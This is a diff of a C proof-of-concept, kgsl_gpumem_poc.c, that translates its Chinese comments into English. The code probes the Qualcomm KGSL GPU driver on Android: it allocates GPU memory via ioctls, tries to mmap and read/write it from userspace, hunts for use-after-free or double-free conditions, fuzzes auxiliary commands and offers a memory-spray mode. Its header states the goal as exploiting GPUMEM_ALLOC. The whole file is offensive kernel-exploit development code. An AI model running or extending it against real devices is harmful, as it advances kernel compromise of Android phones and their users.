@@ -1,17 +1,17 @@
 /*
- * kgsl_gpumem_poc.c - 利用 GPUMEM_ALLOC 進行漏洞利用
+ * kgsl_gpumem_poc.c - exploiting GPUMEM_ALLOC
  *
- * 重大發現:
- * - GPUMEM_ALLOC 成功! gpuaddr=0x4000000000
- * - SYNCSOURCE_CREATE_FENCE 成功!
- * - GPU_AUX_COMMAND 成功!
+ * Major findings:
+ * - GPUMEM_ALLOC succeeded! gpuaddr=0x4000000000
+ * - SYNCSOURCE_CREATE_FENCE succeeded!
+ * - GPU_AUX_COMMAND succeeded!
  *
- * 策略:
- * 1. 分配大量 GPU 記憶體
- * 2. 嘗試 mmap 這些記憶體到用戶空間
- * 3. 尋找 UAF 或 double-free 機會
+ * Strategy:
+ * 1. Allocate a large amount of GPU memory
+ * 2. Try to mmap this memory into userspace
+ * 3. Look for a UAF or double-free opportunity
  *
- * 編譯:
+ * Build:
  * aarch64-linux-android31-clang -static -O2 -o kgsl_gpumem_poc kgsl_gpumem_poc.c
  */
 
@@ -47,19 +47,19 @@
 #define KGSL_MEMFLAGS_SECURE 0x00000100
 #define KGSL_MEMFLAGS_IOCOHERENT 0x00020000
 
-/* gpumem_alloc 結構 */
+/* gpumem_alloc structure */
 struct kgsl_gpumem_alloc
 {
     uint64_t gpuaddr; // out
     uint64_t size;    // in/out
     uint32_t flags;   // in
     uint32_t padding;
-    // 總共 24 字節
+    // 24 bytes in total
 };
 
 int g_kgsl_fd = -1;
 
-/* 分配 GPU 記憶體 */
+/* allocate GPU memory */
 int alloc_gpumem(int fd, uint64_t size, uint32_t flags, uint64_t *gpuaddr)
 {
     struct kgsl_gpumem_alloc req = {0};
@@ -81,7 +81,7 @@ void test_gpumem_allocation(int fd)
     uint64_t gpuaddr;
     int ret;
 
-    // 測試不同大小
+    // Test different sizes
     uint64_t sizes[] = {0x1000, 0x10000, 0x100000, 0x1000000};
 
     for (int i = 0; i < 4; i++)
@@ -91,7 +91,7 @@ void test_gpumem_allocation(int fd)
                sizes[i], ret, gpuaddr);
     }
 
-    // 測試不同 flags
+    // Test different flags
     printf("\n[*] Testing different flags:\n");
 
     uint32_t flags[] = {
@@ -127,7 +127,7 @@ void test_gpumem_mmap(int fd)
 
     printf("[+] Allocated GPU memory at 0x%lx\n", gpuaddr);
 
-    // 嘗試用 gpuaddr 作為 offset 進行 mmap
+    // Try mmap using gpuaddr as the offset
     void *ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                      MAP_SHARED, fd, gpuaddr);
     if (ptr == MAP_FAILED)
@@ -138,7 +138,7 @@ void test_gpumem_mmap(int fd)
     {
         printf("[+] mmap SUCCESS! ptr=%p\n", ptr);
 
-        // 嘗試讀寫
+        // Try to read and write
         printf("[*] Reading from GPU memory...\n");
         uint32_t val = *(volatile uint32_t *)ptr;
         printf("    Read: 0x%08x\n", val);
@@ -151,7 +151,7 @@ void test_gpumem_mmap(int fd)
         munmap(ptr, 0x1000);
     }
 
-    // 嘗試 offset=0
+    // Try offset=0
     ptr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                MAP_SHARED, fd, 0);
     if (ptr == MAP_FAILED)
@@ -221,7 +221,7 @@ void test_uaf_scenario(int fd)
 
     uint64_t gpuaddr;
 
-    // 分配
+    // Allocate
     int ret = alloc_gpumem(fd, 0x1000, 0, &gpuaddr);
     if (ret < 0)
     {
@@ -230,7 +230,7 @@ void test_uaf_scenario(int fd)
     }
     printf("[+] Allocated at 0x%lx\n", gpuaddr);
 
-    // 嘗試釋放 (需要找到正確的 ioctl)
+    // Try to free (the correct ioctl must be found)
     uint64_t free_addr = gpuaddr;
 
     errno = 0;
@@ -238,7 +238,7 @@ void test_uaf_scenario(int fd)
     printf("[*] GPUMEM_FREE: ret=%d, errno=%d (%s)\n",
            ret, errno, strerror(errno));
 
-    // 嘗試不同的 free 結構
+    // Try different free structures
     struct
     {
         uint64_t gpuaddr;
@@ -255,7 +255,7 @@ void test_uaf_scenario(int fd)
     printf("[*] GPUMEM_FREE (struct): ret=%d, errno=%d (%s)\n",
            ret, errno, strerror(errno));
 
-    // 測試 GPUMEM_FREE_ID
+    // Test GPUMEM_FREE_ID
     struct
     {
         uint32_t id;
@@ -279,7 +279,7 @@ void test_gpu_aux_command(int fd)
         uint64_t data[4];
     } aux_req = {0};
 
-    // 測試不同的參數
+    // Test different parameters
     for (int i = 0; i < 16; i++)
     {
         memset(&aux_req, 0, sizeof(aux_req));
@@ -343,22 +343,22 @@ int main(int argc, char **argv)
     }
     printf("[+] Opened /dev/kgsl-3d0: fd=%d\n", g_kgsl_fd);
 
-    // 測試 GPU 記憶體分配
+    // Test GPU memory allocation
     test_gpumem_allocation(g_kgsl_fd);
 
-    // 測試 mmap
+    // Test mmap
     test_gpumem_mmap(g_kgsl_fd);
 
-    // 測試 SYNCSOURCE
+    // Test SYNCSOURCE
     test_syncsource(g_kgsl_fd);
 
-    // 測試 GPU_AUX_COMMAND
+    // Test GPU_AUX_COMMAND
     test_gpu_aux_command(g_kgsl_fd);
 
-    // 測試 UAF 場景
+    // Test the UAF scenario
     test_uaf_scenario(g_kgsl_fd);
 
-    // GPU 記憶體噴射
+    // GPU memory spray
     if (argc > 1 && strcmp(argv[1], "-spray") == 0)
     {
         int count = 100;
